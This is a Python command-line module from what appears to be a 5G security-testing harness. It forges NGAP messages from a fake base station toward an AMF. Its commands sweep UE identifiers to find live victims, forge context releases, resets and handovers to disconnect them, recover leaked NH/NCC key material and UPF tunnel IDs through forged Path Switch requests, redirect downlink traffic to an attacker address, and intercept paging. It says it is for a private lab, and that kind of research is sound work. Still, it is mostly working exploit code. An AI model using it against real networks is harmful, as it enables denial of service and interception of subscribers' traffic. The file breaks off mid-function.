"""CLI: pick which NGAP packet to send as a subcommand.

  sctp-ping                         open ONLY the SCTP association (no NGAP) to
                                    check L4 reachability + show the source IP the
                                    AMF sees (isolates network vs NGAP problems)
  ng-setup                          connect + NG Setup (connectivity milestone)
  ue-release  --amf-ue-id N         forge UE CONTEXT RELEASE REQUEST for a victim
  error-indication --amf-ue-id N    forge ERROR INDICATION for a victim
  ng-reset    --targets a:r,...     forge NG RESET (partial) for victim UE(s)
  path-switch --source-amf-ue-id N  forge PATH SWITCH REQUEST; decode the ACK to
                                    recover the leaked {NH,NCC} + UPF N3 TEID
  handover-required --amf-ue-id N   forge HANDOVER REQUIRED (relocation/DoS)
  ho-window-inject --amf-ue-id N    open N2 HO window (Required→self as target),
                                    Ack HandoverRequest, inject p21 and/or p09
  chain-ps-release ...                 Path Switch THEN UEContextRelease (same SCTP)
  chain-initue-release ...             InitialUE (5G-S-TMSI) THEN UEContextRelease
  sweep --attack X --amf-range LO-HI   enumerate AMF-UE-NGAP-ID (finds live victims)

Every command (except ng-setup) performs NG Setup first. Victim identifiers:
pass them explicitly, or use `sweep` to enumerate — no manual ID lookup needed.

This is a controlled, defensive validation harness for a private 5G lab
(net-5glab, Open5GS + UERANSIM). It reproduces source-verified cross-gNB NGAP
weaknesses to measure their real impact; it is not for use against any network
you are not authorized to test.
"""
from __future__ import annotations

import argparse
import json
import socket
import sys
import time

from . import ngap, builders as B, decode
from .gnb import FakeGNB


def load_cfg(path, overrides):
    with open(path) as f:
        cfg = json.load(f)
    cfg.update({k: v for k, v in overrides.items() if v is not None})
    return cfg


def detect_local_ip(peer_ip: str, peer_port: int = 38412) -> str:
    """Best-effort: the source IP the kernel would use to reach the AMF — i.e.
    this container's address on net-5glab, usable as the attacker N3 endpoint."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((peer_ip, peer_port))
        return s.getsockname()[0]
    finally:
        s.close()


def resolve_attacker_ip(cfg, a) -> str:
    ip = getattr(a, "attacker_ip", None)
    if ip in (None, "auto"):
        return detect_local_ip(cfg["amf_addr"], int(cfg.get("amf_port", 38412)))
    return ip


def parse_sessions(spec) -> list[int]:
    if not spec:
        return [1]
    return [int(x) for x in str(spec).split(",")]


def parse_seccap(spec):
    """--seccap 'nea,nia' as 16-bit hex bitmaps (MSB=algo0). Default None => the
    builder's NEA0/NIA0-only (0x8000), which every AMF accepts (mismatch is a
    non-fatal warning in Open5GS 2.8.0 ngap-handler.c:3309)."""
    if not spec:
        return {}
    nea, nia = (int(x, 0) for x in str(spec).split(","))
    return {"nea": nea, "nia": nia}


def do_ng_setup(gnb) -> bool:
    resp = gnb.ng_setup()
    mt = ngap.message_type(resp)
    ok = (mt == "NGSetupResponse")
    print(f"[NG Setup] {ngap.summarize(resp)}  -> "
          f"{'ACCEPTED' if ok else 'REJECTED: ' + str(mt)}")
    return ok


def _save(evidence, obj):
    if not evidence:
        return
    with open(evidence, "a") as f:
        f.write(json.dumps(obj) + "\n")
    print(f"[evidence] appended to {evidence}")


def cmd_ue_release(gnb, a):
    r = gnb.send(B.ue_context_release_request(a.amf_ue_id, a.ran_ue_id))
    print(f"[ue-release] amf={a.amf_ue_id} ran={a.ran_ue_id} -> "
          f"{ngap.summarize(r) if r else '(no reply to us)'}")


def cmd_error_indication(gnb, a):
    r = gnb.send(B.error_indication(a.amf_ue_id, a.ran_ue_id))
    print(f"[error-indication] amf={a.amf_ue_id} ran={a.ran_ue_id} -> "
          f"{ngap.summarize(r) if r else '(no reply to us)'}")


def cmd_ng_reset(gnb, a):
    # "amf:ran" -> (amf, ran); bare "amf" -> (amf, None) = AMF-UE-ID-only (forces
    # the unbound global resolution path).
    pairs = []
    for p in a.targets.split(","):
        bits = p.split(":")
        pairs.append((int(bits[0]), int(bits[1]) if len(bits) > 1 else None))
    r = gnb.send(B.ng_reset_partial(pairs))
    print(f"[ng-reset] targets={pairs} -> {ngap.summarize(r) if r else '(no reply)'}")


def cmd_initial_ue(gnb, a):
    """Forge InitialUEMessage keyed by victim 5G-S-TMSI (binding-steal probe).

    Compares against Path Switch: does NOT take Source AMF-UE-NGAP-ID; allocates a
    new RanUe/AmfUeNgapId path. On free5GC CM-CONNECTED the victim serving binding
    is typically NOT stolen (NewAmfUe empty). On Open5GS associate may move NG.
    """
    tmsi = a.tmsi
    nas_pdu = _build_initue_nas(a)
    print(f"[initial-ue] ran-ue-id={a.ran_ue_id} "
          f"5G-S-TMSI set={a.amf_set_id:#x} ptr={a.amf_pointer:#x} tmsi={tmsi} "
          f"nas={nas_pdu.hex() if nas_pdu else 'default'}")
    r = gnb.send(B.initial_ue_message(
        a.ran_ue_id, gnb.cfg,
        amf_set_id=a.amf_set_id, amf_pointer=a.amf_pointer, tmsi=tmsi,
        nas_pdu=nas_pdu,
        ue_context_request=not getattr(a, "no_ue_ctx_req", False)),
        wait=True)
    print(f"[initial-ue] reply: {ngap.summarize(r) if r else '(no reply / Class-2)'}")
    _save(a.evidence, {"attack": "initial-ue",
                       "ran_ue_id": a.ran_ue_id,
                       "amf_set_id": a.amf_set_id,
                       "amf_pointer": a.amf_pointer,
                       "tmsi": tmsi,
                       "reply": ngap.message_type(r) if r else None})


def cmd_path_switch(gnb, a):
    attacker_ip = resolve_attacker_ip(gnb.cfg, a)
    sessions = parse_sessions(a.pdu_sessions)
    seccap = parse_seccap(getattr(a, "seccap", None))
    print(f"[path-switch] source-amf-ue-id={a.source_amf_ue_id} ran-ue-id={a.ran_ue_id} "
          f"pdu={sessions} attacker-n3={attacker_ip} teid={a.teid:#010x}")
    r = gnb.send(B.path_switch_request(
        a.source_amf_ue_id, a.ran_ue_id, gnb.cfg, pdu_sessions=sessions,
        attacker_ip=attacker_ip, teid=a.teid, **seccap))
    if not r:
        print("[path-switch] no reply (victim id likely not resolvable / rejected silently)")
        return
    mt = ngap.message_type(r)
    print(f"[path-switch] reply: {ngap.summarize(r)}")
    if mt == "PathSwitchRequestAcknowledge":
        leak = decode.path_switch_ack_leak(r)
        print("\n=== CROSS-gNB DISCLOSURE CONFIRMED ===")
        print(decode.summarize_leak(leak))
        print("======================================\n")
        _save(a.evidence, {"attack": "path-switch",
                           "source_amf_ue_id": a.source_amf_ue_id,
                           "attacker_n3_ip": attacker_ip, "teid": a.teid,
                           "result": mt, "leak": leak,
                           "reply_raw_hex": getattr(gnb, "last_reply_raw", b"").hex()
                           if getattr(gnb, "last_reply_raw", None) else None})
    else:
        _save(a.evidence, {"attack": "path-switch",
                           "source_amf_ue_id": a.source_amf_ue_id,
                           "result": mt})


def cmd_handover_required(gnb, a):
    r = gnb.send(B.handover_required(a.amf_ue_id, a.ran_ue_id, gnb.cfg,
                                     target_gnb_id=a.target_gnb_id))
    print(f"[handover-required] amf={a.amf_ue_id} target-gnb={a.target_gnb_id:#x} -> "
          f"{ngap.summarize(r) if r else '(no reply to us)'}")
    _save(a.evidence, {"attack": "handover-required", "amf_ue_id": a.amf_ue_id,
                       "result": ngap.message_type(r) if r else None})


def cmd_ho_window_inject(gnb, a):
    """Open an N2 handover preparation window, then inject HO-gated messages.

    Chain (same SCTP association):
      1. HandoverRequired naming THIS FakeGNB as TargetID (victim AMF-UE-NGAP-ID)
         — Open5GS associates source↔target with no gNB binding (p03).
      2. Wait for HandoverRequest; learn target AMF/RAN-UE-NGAP-IDs.
      3. HandoverRequestAcknowledge (completes preparation / SMF prepared state).
      4. Inject --mode:
           p21  UplinkRANStatusTransfer with *source* AMF-UE-NGAP-ID
                (expects DownlinkRANStatusTransfer back to us as target)
           p09  HandoverNotify with *target* AMF-UE-NGAP-ID
                (expects serving-node switch + UEContextReleaseCommand to source)
           both run p21 then p09
    Idle p09/p21 on Open5GS fail with 'Cannot find Source-UE Context'; this
    command is the controlled mid-handover counterpart.
    """
    V = a.amf_ue_id
    target_gnb = (a.target_gnb_id if getattr(a, "target_gnb_id", None) is not None
                  else int(gnb.cfg["gnb_id"]))
    sessions = parse_sessions(getattr(a, "pdu_sessions", "1") or "1")
    attacker_ip = resolve_attacker_ip(gnb.cfg, a)
    mode = getattr(a, "mode", "both")
    wait_s = float(getattr(a, "wait", 8.0))
    gap = float(getattr(a, "gap", 0.5))
    seen = {"ho_req": None, "dl_status": 0, "rel_cmd": 0, "other": []}

    print(f"[ho-window] step1 HandoverRequired victim-amf={V} "
          f"target-gnb={target_gnb:#x} (self) ran-ue={a.ran_ue_id}")
    gnb.send(B.handover_required(V, a.ran_ue_id, gnb.cfg, target_gnb_id=target_gnb,
                                 pdu_sessions=sessions), wait=False)
    _save(a.evidence, {"attack": "ho-window-inject", "step": "handover-required",
                       "source_amf_ue_id": V, "target_gnb_id": target_gnb})

    print(f"[ho-window] step2 waiting <={wait_s}s for HandoverRequest ...")
    gnb.conn.sk.settimeout(1.0)
    deadline = time.monotonic() + wait_s
    while time.monotonic() < deadline and seen["ho_req"] is None:
        try:
            raw = gnb.conn.recv()
        except (OSError, socket.timeout):
            continue
        if not raw:
            continue
        try:
            pdu = ngap.decode(raw)
        except Exception as e:
            print(f"[ho-window] step2 decode-fail ({e}); raw={raw.hex()[:64]}...")
            continue
        mt = ngap.message_type(pdu)
        if mt == "HandoverRequest":
            ids = decode.handover_request_ids(pdu)
            seen["ho_req"] = ids
            print(f"[ho-window] step2 got HandoverRequest "
                  f"target-amf={ids.get('amf_ue_ngap_id')} "
                  f"target-ran={ids.get('ran_ue_ngap_id')}")
            _save(a.evidence, {"attack": "ho-window-inject", "step": "handover-request",
                               **ids})
        else:
            seen["other"].append(mt)
            print(f"[ho-window] step2 ignoring {mt}")

    if seen["ho_req"] is None:
        print("[ho-window] NO HandoverRequest — window not opened "
              "(check AMF log: target gNB / SMF prepared). Aborting inject.")
        _save(a.evidence, {"attack": "ho-window-inject", "step": "abort",
                           "reason": "no-handover-request", "other": seen["other"]})
        return

    tgt_amf = int(seen["ho_req"]["amf_ue_ngap_id"])
    tgt_ran = a.ran_ue_id  # claim a concrete RAN-UE-NGAP-ID in the Ack
    print(f"[ho-window] step3 HandoverRequestAcknowledge "
          f"amf={tgt_amf} ran={tgt_ran} n3={attacker_ip}")
    gnb.send(B.handover_request_acknowledge(
        tgt_amf, tgt_ran, pdu_sessions=sessions,
        attacker_ip=attacker_ip, teid=a.teid), wait=False)
    _save(a.evidence, {"attack": "ho-window-inject", "step": "handover-request-ack",
                       "target_amf_ue_id": tgt_amf, "target_ran_ue_id": tgt_ran,
                       "attacker_n3_ip": attacker_ip})
    time.sleep(gap)

    if mode in ("p21", "both"):
        print(f"[ho-window] step4 inject p21 UplinkRANStatusTransfer "
              f"source-amf={V} (expect DownlinkRANStatusTransfer → us)")
        gnb.send(B.uplink_ran_status_transfer(V, a.ran_ue_id), wait=False)
        _save(a.evidence, {"attack": "ho-window-inject", "step": "p21-ul-ran-status",
                           "source_amf_ue_id": V})
        time.sleep(gap)

    if mode in ("p09", "both"):
        print(f"[ho-window] step5 inject p09 HandoverNotify "
              f"target-amf={tgt_amf} ran={tgt_ran} "
              f"(expect UEContextReleaseCommand → victim source gNB)")
        gnb.send(B.handover_notify(tgt_amf, tgt_ran, gnb.cfg), wait=False)
        _save(a.evidence, {"attack": "ho-window-inject", "step": "p09-handover-notify",
                           "target_amf_ue_id": tgt_amf, "target_ran_ue_id": tgt_ran})

    listen_s = float(getattr(a, "listen", 5.0))
    print(f"[ho-window] step6 listening {listen_s}s for follow-on NGAP ...")
    end = time.monotonic() + listen_s
    while time.monotonic() < end:
        try:
            raw = gnb.conn.recv()
        except (OSError, socket.timeout):
            continue
        if not raw:
            continue
        try:
            pdu = ngap.decode(raw)
        except Exception:
            continue
        mt = ngap.message_type(pdu)
        if mt == "DownlinkRANStatusTransfer":
            seen["dl_status"] += 1
            print("[ho-window]   << DownlinkRANStatusTransfer (p21 relay CONFIRMED)")
            _save(a.evidence, {"attack": "ho-window-inject",
                               "step": "downlink-ran-status", "result": mt})
        elif mt == "UEContextReleaseCommand":
            seen["rel_cmd"] += 1
            print("[ho-window]   << UEContextReleaseCommand (on our assoc — unusual; "
                  "normally sent to source gNB; recording)")
            _save(a.evidence, {"attack": "ho-window-inject",
                               "step": "ue-context-release-command", "result": mt})
        else:
            print(f"[ho-window]   << {mt}")
            _save(a.evidence, {"attack": "ho-window-inject", "step": "follow-on",
                               "result": mt})

    print(f"[ho-window] done: ho_req={'yes' if seen['ho_req'] else 'no'} "
          f"dl_status={seen['dl_status']} rel_cmd_here={seen['rel_cmd']}")


def cmd_pdu_notify(gnb, a):
    gnb.send(B.pdu_session_resource_notify(a.amf_ue_id, a.ran_ue_id), wait=False)
    print(f"[pdu-notify] amf={a.amf_ue_id} sent (Class-2, no direct reply)")


def cmd_handover_notify(gnb, a):
    gnb.send(B.handover_notify(a.amf_ue_id, a.ran_ue_id, gnb.cfg), wait=False)
    print(f"[handover-notify] amf={a.amf_ue_id} sent (Class-2)")


def cmd_nrppa(gnb, a):
    gnb.send(B.uplink_ue_associated_nrppa_transport(a.amf_ue_id, a.ran_ue_id), wait=False)
    print(f"[ul-nrppa] amf={a.amf_ue_id} sent (Class-2)")


def cmd_cell_trace(gnb, a):
    ip = resolve_attacker_ip(gnb.cfg, a)
    gnb.send(B.cell_traffic_trace(a.amf_ue_id, a.ran_ue_id, gnb.cfg, tce_ip=ip), wait=False)
    print(f"[cell-trace] amf={a.amf_ue_id} tce-ip={ip} sent (Class-2)")


def cmd_ran_status(gnb, a):
    gnb.send(B.uplink_ran_status_transfer(a.amf_ue_id, a.ran_ue_id), wait=False)
    print(f"[ul-ran-status] amf={a.amf_ue_id} sent (Class-2)")


def cmd_ran_config_update(gnb, a):
    """g02: claim the victim TAI via RAN Configuration Update, then listen for the
    PAGING the AMF fans out to us (idle-UE paging interception)."""
    r = gnb.send(B.ran_configuration_update(gnb.cfg, tac=a.tac), wait=True)
    print(f"[ran-config-update] claim TAI PLMN={gnb.cfg['mcc']}/{gnb.cfg['mnc']} "
          f"TAC={a.tac if a.tac is not None else gnb.cfg['tac']} -> "
          f"{ngap.message_type(r) if r else '(no ack — may still take effect)'}")
    print(f"[ran-config-update] listening {a.listen}s for PAGING "
          f"(page the idle victim UE now, e.g. send it downlink)...")
    seen = {"n": 0}

    def on_msg(pdu):
        if ngap.message_type(pdu) == "Paging":
            info = decode.paging_info(pdu)
            seen["n"] += 1
            print(f"  [PAGING INTERCEPTED] 5G-S-TMSI={info.get('fiveg_s_tmsi')} "
                  f"TAIs={info.get('tais')}")
            _save(a.evidence, {"attack": "paging-intercept", "paging": info})

    gnb.listen(a.listen, on_msg)
    print(f"[ran-config-update] done ({seen['n']} PAGING intercepted)")


def cmd_ul_ran_config_transfer(gnb, a):
    """g09: blind-relay SON/Xn config toward an attacker-named target gNB."""
    gnb.send(B.uplink_ran_configuration_transfer(
        gnb.cfg, target_gnb_id=a.target_gnb_id, source_gnb_id=a.source_gnb_id), wait=False)
    print(f"[ul-ran-config-transfer] SON inject relayed via AMF -> "
          f"target gNB-id={a.target_gnb_id:#x} (blind relay; observe DownlinkRAN"
          f"ConfigurationTransfer at the target)")
    _save(a.evidence, {"attack": "son-inject", "target_gnb_id": a.target_gnb_id})


def cmd_sweep(gnb, a):
    lo, hi = (int(x) for x in a.amf_range.split("-"))
    attacker_ip = resolve_attacker_ip(gnb.cfg, a) if a.attack == "path-switch" else None
    print(f"[sweep] {a.attack} over AMF-UE-NGAP-ID {lo}..{hi} "
          f"(ran-ue-id={a.ran_ue_id}, delay={a.delay}s)")
    hits = []
    for i in range(lo, hi + 1):
        if a.attack == "error-indication":
            val, wait = B.error_indication(i, a.ran_ue_id), False
        elif a.attack == "ue-release":
            val, wait = B.ue_context_release_request(i, a.ran_ue_id), False
        elif a.attack == "ng-reset":
            val, wait = B.ng_reset_partial([(i, a.ran_ue_id)]), False
        else:  # path-switch — wait for the ACK so we can capture the leak per victim
            val, wait = B.path_switch_request(
                i, a.ran_ue_id, gnb.cfg, pdu_sessions=parse_sessions(a.pdu_sessions),
                attacker_ip=attacker_ip, teid=a.teid,
                **parse_seccap(getattr(a, "seccap", None))), True
        r = gnb.send(val, wait=wait)
        if wait and r and ngap.message_type(r) == "PathSwitchRequestAcknowledge":
            leak = decode.path_switch_ack_leak(r)
            print(f"  [HIT] AMF-UE-NGAP-ID={i}: "
                  f"NCC={leak['ncc']} NH={leak['nh']} "
                  f"sessions={[(s['pdu_session_id'], s['upf_n3_ip'], s['upf_n3_teid']) for s in leak['sessions']]}")
            hits.append(leak)
            _save(a.evidence, {"attack": "sweep-path-switch", "amf_ue_ngap_id": i,
                               "leak": leak})
        if a.delay:
            time.sleep(a.delay)
    print(f"[sweep] done ({len(hits)} live victim(s) disclosed)" if a.attack == "path-switch"
          else "[sweep] done")


def cmd_gtpu_sink(a):
    """Standalone: receive the redirected downlink G-PDUs (proves interception).
    No SCTP / NG Setup — run this in a second container while path-switch fires."""
    from . import gtpu_sink
    gtpu_sink.run_sink(bind_ip=a.bind_ip, port=a.port,
                       duration=a.duration, evidence=a.evidence)


def cmd_sctp_ping(cfg):
    """Layer-4 reachability probe: open ONLY the SCTP association to the AMF (no
    NGAP, no NG Setup) and report the source IP the AMF sees.

    Isolates network problems from NGAP/provisioning problems:
      - FAIL here  => routing / firewall / SCTP-through-NAT issue. On Windows this
        is almost always because traffic is NAT'd (WinNAT does NOT pass SCTP, and
        Docker Desktop host-networking is TCP/UDP-only). Run inside a WSL2 distro
        with mirrored networking so the AMF is reached over the host NIC directly.
      - OK here but NG Setup still REJECTED => the SCTP path is fine; it's an NGAP
        mismatch (PLMN/TAC/NSSAI/gNB-id) or the source IP is not whitelisted.
    """
    from .sctp_conn import SctpNgap
    dst = cfg["amf_addr"]
    port = int(cfg.get("amf_port", 38412))
    if dst in (None, "", "REPLACE_ME"):
        print("[sctp-ping] amf_addr is not set — edit the config or pass --amf-addr")
        sys.exit(2)
    print(f"[sctp-ping] opening SCTP association to AMF {dst}:{port} "
          f"(bind_ip={cfg.get('bind_ip') or 'auto'}) ...")
    conn = SctpNgap(dst, port, cfg.get("bind_ip"),
                    timeout=float(cfg.get("timeout", 5.0)))
    try:
        conn.connect()
    except Exception as e:
        print(f"[sctp-ping] FAILED: {e!r}")
        print("  -> SCTP association could NOT be established. Check, in order:")
        print("     1) Is traffic being NAT'd? WinNAT / Docker Desktop do NOT pass")
        print("        SCTP. Run this inside a WSL2 distro with mirrored networking")
        print("        (see the deploy guide), NOT via Docker Desktop.")
        print(f"     2) Can the host reach the AMF at all?  ping {dst}")
        print(f"     3) AMF/firewall SCTP :{port} open, and this source IP allowed.")
        sys.exit(1)
    try:
        src_ip, src_port = conn.sk.getsockname()[:2]
        print("[sctp-ping] SUCCESS — SCTP association established.")
        print(f"  source endpoint the AMF sees: {src_ip}:{src_port}")
        print("  -> Layer-4 path is OK. If NG Setup is REJECTED next, it's an NGAP")
        print("     mismatch (PLMN/TAC/NSSAI/gNB-id) or a non-whitelisted source IP,")
        print("     NOT the network. Ask the AMF operator to allow the IP above.")
    finally:
        conn.close()


def _build_initue_nas(a) -> bytes | None:
    """Resolve NAS-PDU for InitialUE / chain-initue-release.

    Priority: --nas-hex > --nas-integrity (fake MAC wrapper) > builder default
    (structurally complete plain Service Request).
    """
    if getattr(a, "nas_hex", None):
        return bytes.fromhex(a.nas_hex)
    if getattr(a, "nas_integrity", False):
        return B.service_request_nas_integrity_protected(
            a.amf_set_id, a.amf_pointer, a.tmsi)
    return None  # builders.initial_ue_message uses full plain Service Request


def _await_ue_context_release_command(gnb, wait_s: float):
    """Poll the association for UEContextReleaseCommand; return decoded PDU or None."""
    gnb.conn.sk.settimeout(1.0)
    deadline = time.monotonic() + float(wait_s)
    while time.monotonic() < deadline:
        try:
            raw = gnb.conn.recv()
        except (OSError, socket.timeout):
            continue
        if not raw:
            continue
        try:
            pdu = ngap.decode(raw)
        except Exception:
            continue
        mt = ngap.message_type(pdu)
        if mt == "UEContextReleaseCommand":
            return pdu
        print(f"[chain] ignoring unexpected DL {mt}")
    return None


def cmd_chain_initue_release(gnb, a):
    """CHAIN: InitialUEMessage (victim 5G-S-TMSI) THEN UEContextReleaseRequest.

    Contrast with chain-ps-release (which KEEDS the victim AmfUeNgapId via Path
    Switch rebind). InitialUE always opens a *new* RanUe on the attacker TNLA and
    resolves the AmfUe by FiveG-S-TMSI:

      free5GC CM-CONNECTED : NewAmfUe("") — victim serving NOT stolen; learned AU
                             (if any) is an empty attacker-local context.
      Open5GS              : Holding NG + associate — serving may soft-rebind; new
                             AMF_UE_NGAP_ID allocated on the attacker ran_ue.
      OAI                  : GUTI hit updates nas_context IDs; DL often carries the
                             new AU back to the requester.

    Release targets (same association, same --ran-ue-id):
      victim  : --victim-amf-ue-id (pre-attack serving AU) — expect REJECT if
                binding never moved / old AU still on legit gNB.
      learned : AU observed in DL after InitialUE — expect ACCEPT if that AU now
                lives on the attacker Ran (Open5GS/OAI soft-rebind path).
      both    : try victim then learned (default when victim id is given).

    Must share ONE SCTP association so any soft-rebind and the follow-up Release
    see the same `ran` / gnb_id. Completes the Release Command handshake when
    Command arrives (optional PDU list for SMF deactivate paths).
    """
    sessions = parse_sessions(a.pdu_sessions)
    ran_ue_id = a.ran_ue_id
    victim_au = getattr(a, "victim_amf_ue_id", None)
    target_mode = getattr(a, "release_target", None) or (
        "both" if victim_au is not None else "learned")
    listen_s = float(getattr(a, "initue_listen", 3.0))
    gap = float(getattr(a, "gap", 0.5))
    release_wait = float(getattr(a, "release_wait", 5.0))

    nas_pdu = _build_initue_nas(a)
    print(f"[chain-initue] step1 InitialUEMessage ran-ue-id={ran_ue_id} "
          f"5G-S-TMSI set={a.amf_set_id:#x} ptr={a.amf_pointer:#x} tmsi={a.tmsi}")
    if nas_pdu is not None:
        print(f"[chain-initue]   NAS-PDU ({len(nas_pdu)}B)={nas_pdu.hex()}")
    else:
        preview = B.service_request_nas(a.amf_set_id, a.amf_pointer, a.tmsi)
        print(f"[chain-initue]   NAS-PDU default plain SR ({len(preview)}B)="
              f"{preview.hex()}")
    gnb.send(B.initial_ue_message(
        ran_ue_id, gnb.cfg,
        amf_set_id=a.amf_set_id, amf_pointer=a.amf_pointer, tmsi=a.tmsi,
        nas_pdu=nas_pdu,
        ue_context_request=not getattr(a, "no_ue_ctx_req", False)),
        wait=False)
    _save(a.evidence, {"attack": "chain-initue-release", "step": "initial-ue",
                       "ran_ue_id": ran_ue_id,
                       "amf_set_id": a.amf_set_id, "amf_pointer": a.amf_pointer,
                       "tmsi": a.tmsi, "victim_amf_ue_id": victim_au,
                       "nas_hex": (nas_pdu or B.service_request_nas(
                           a.amf_set_id, a.amf_pointer, a.tmsi)).hex(),
                       "nas_integrity": bool(getattr(a, "nas_integrity", False))})

    print(f"[chain-initue] step1b listening {listen_s}s for DL carrying new AU ...")
    learned_au = None
    learned_ran = None
    seen_dl = []

    def on_dl(pdu):
        nonlocal learned_au, learned_ran
        mt = ngap.message_type(pdu)
        seen_dl.append(mt)
        info = decode.downlink_nas_info(pdu) if mt == "DownlinkNASTransport" \
            else decode.ue_ngap_ids(pdu)
        if not info:
            print(f"[chain-initue]   DL {mt} (no UE NGAP IDs)")
            return
        nas = info.get("nas") or {}
        extra = ""
        if nas:
            extra = (f" NAS={nas.get('message')} "
                     f"cause={nas.get('gmm_cause_name')}(0x{nas.get('gmm_cause', 0):02x})")
        print(f"[chain-initue]   DL {mt} AU={info.get('amf_ue_ngap_id')} "
              f"RU={info.get('ran_ue_ngap_id')}{extra}")
        if info.get("amf_ue_ngap_id") is not None:
            learned_au = int(info["amf_ue_ngap_id"])
        if info.get("ran_ue_ngap_id") is not None:
            learned_ran = int(info["ran_ue_ngap_id"])
        _save(a.evidence, {"attack": "chain-initue-release", "step": "dl-after-initue",
                           **info})

    gnb.listen(listen_s, on_dl)
    print(f"[chain-initue] learned AU={learned_au} RU={learned_ran} "
          f"dl_msgs={seen_dl or ['(none)']}")

    # Build ordered release targets: (label, amf_ue_id, ran_ue_id)
    targets = []
    if target_mode in ("victim", "both"):
        if victim_au is None:
            print("[chain-initue] WARN: --release-target needs --victim-amf-ue-id "
                  "for 'victim'/'both'; skipping victim target")
        else:
            targets.append(("victim", int(victim_au), ran_ue_id))
    if target_mode in ("learned", "both"):
        if learned_au is None:
            print("[chain-initue] WARN: no AU learned from DL after InitialUE; "
                  "skipping 'learned' target (Class-2 may yield no DL)")
        else:
            # Prefer AMF-returned RAN-UE-ID when present (OAI may echo it);
            # else keep attacker-chosen ran_ue_id used in InitialUE.
            ru = learned_ran if learned_ran is not None else ran_ue_id
            targets.append(("learned", int(learned_au), int(ru)))
    if not targets:
        print("[chain-initue] ABORT: no release targets (give --victim-amf-ue-id "
              "and/or wait for DL that exposes a new AU)")
        _save(a.evidence, {"attack": "chain-initue-release", "step": "abort",
                           "reason": "no-targets", "dl_msgs": seen_dl})
        return

    for label, au, ru in targets:
        time.sleep(gap)
        print(f"[chain-initue] step2 release target={label} AU={au} RU={ru} "
              f"pdu={sessions} (same association)")
        gnb.send(B.ue_context_release_request(au, ru, pdu_sessions=sessions),
                 wait=False)
        _save(a.evidence, {"attack": "chain-initue-release", "step": "ue-release",
                           "target": label, "amf_ue_ngap_id": au, "ran_ue_id": ru,
                           "pdu_sessions": list(sessions)})
        print(f"[chain-initue] step3 waiting for UEContextReleaseCommand "
              f"(target={label}) ...")
        cmd = _await_ue_context_release_command(gnb, release_wait)
        if not cmd:
            print(f"[chain-initue] step3 NO Command for target={label} "
                  f"(rejected / ErrorIndication / silent)")
            _save(a.evidence, {"attack": "chain-initue-release",
                               "step": "release-command", "target": label,
                               "result": None})
            continue
        cmd_ids = decode.ue_ngap_ids(cmd)
        print(f"[chain-initue] step3 got Command for target={label} "
              f"AU={cmd_ids.get('amf_ue_ngap_id')} RU={cmd_ids.get('ran_ue_ngap_id')} "
              f"-> sending Complete")
        _save(a.evidence, {"attack": "chain-initue-release",
                           "step": "release-command", "target": label,
                           "result": "UEContextReleaseCommand", **cmd_ids})
        gnb.send(B.ue_context_release_complete(au, ru, pdu_sessions=sessions),
                 wait=False)
        _save(a.evidence, {"attack": "chain-initue-release",
                           "step": "release-complete", "target": label,
                           "amf_ue_ngap_id": au, "ran_ue_id": ru,
                           "pdu_sessions": list(sessions)})

    print("[chain-initue] done — compare victim ping / AMF logs: "
          "standalone reject vs initue-then-release")


def cmd_chain_ps_release(gnb, a):
    """CHAIN: Path Switch THEN UEContextReleaseRequest on the SAME SCTP association.

    Hypothesis: a standalone UEContextReleaseRequest is blocked by the sender-
    binding guard (Open5GS ran_ue->gnb_id != gnb->id @ngap-handler.c:1784;
    free5GC ranUe.Ran != ran @handler.go:2333). But Path Switch REBINDS the
    victim's context to the sender (Open5GS ran_ue_switch_to_gnb sets
    ran_ue->gnb_id = attacker; free5GC SwitchToRan sets ranUe.Ran = attacker).
    So after a successful Path Switch on this connection, the guard points at US
    -> the follow-up release on the SAME connection now PASSES -> victim released.
    Both messages MUST share one association (one docker run), or the guard sees
    a different `ran` and rejects. Re-uses the same RAN-UE-NGAP-ID for both so the
    post-switch ran_ue_ngap_id consistency check also passes.

    free5GC idle path: include PDU Session list (id 133) on the Request so AMF
    calls SmContextDeactivateUpCnxState, then answer UEContextReleaseCommand with
    UEContextReleaseComplete (id 116 list) so N2 detach finishes. Without Complete
    the association just drops and Buff/NOCP may never stick.
    """
    V = a.source_amf_ue_id
    sessions = parse_sessions(a.pdu_sessions)
    attacker_ip = resolve_attacker_ip(gnb.cfg, a)
    # step 1 -- Path Switch, wait for ACK (ACK == rebind happened)
    ps = B.path_switch_request(V, a.ran_ue_id, gnb.cfg,
                               pdu_sessions=sessions,
                               attacker_ip=attacker_ip, teid=a.teid,
                               **parse_seccap(getattr(a, "seccap", None)))
    r = gnb.send(ps, wait=True)
    mt = ngap.message_type(r) if r else None
    if mt == "PathSwitchRequestAcknowledge":
        leak = decode.path_switch_ack_leak(r)
        print(f"[chain] step1 Path Switch -> ACK  (REBIND to attacker OK): "
              f"NCC={leak['ncc']} NH={leak['nh']}")
        _save(a.evidence, {"attack": "chain-ps-release", "step": "path-switch-ack",
                           "amf_ue_ngap_id": V, "ran_ue_id": a.ran_ue_id, "leak": leak})
    else:
        print(f"[chain] step1 Path Switch -> {mt or 'no reply'}  "
              f"(REBIND NOT confirmed -- the release below will likely be rejected)")
        _save(a.evidence, {"attack": "chain-ps-release", "step": "path-switch",
                           "amf_ue_ngap_id": V, "reply": mt})
    time.sleep(a.gap)
    # step 2 -- UEContextReleaseRequest (+ PDU list) on the SAME association
    print(f"[chain] step2 UEContextReleaseRequest for AMF-UE-NGAP-ID={V} "
          f"ran-ue-id={a.ran_ue_id} pdu={sessions} "
          f"(same association -> guard now points at us)")
    gnb.send(B.ue_context_release_request(V, a.ran_ue_id, pdu_sessions=sessions),
             wait=False)
    _save(a.evidence, {"attack": "chain-ps-release", "step": "ue-release",
                       "amf_ue_ngap_id": V, "ran_ue_id": a.ran_ue_id,
                       "pdu_sessions": list(sessions)})

    # step 3 -- wait for UEContextReleaseCommand and complete the handshake
    print("[chain] step3 waiting for UEContextReleaseCommand ...")
    cmd = _await_ue_context_release_command(gnb, float(getattr(a, "release_wait", 5.0)))
    if not cmd:
        print("[chain] step3 NO UEContextReleaseCommand — idle/Buff path likely incomplete")
        _save(a.evidence, {"attack": "chain-ps-release", "step": "release-command",
                           "result": None})
        return
    print("[chain] step3 got UEContextReleaseCommand -> sending Complete "
          f"(pdu={sessions})")
    gnb.send(B.ue_context_release_complete(V, a.ran_ue_id, pdu_sessions=sessions),
             wait=False)
    _save(a.evidence, {"attack": "chain-ps-release", "step": "release-complete",
                       "amf_ue_ngap_id": V, "ran_ue_id": a.ran_ue_id,
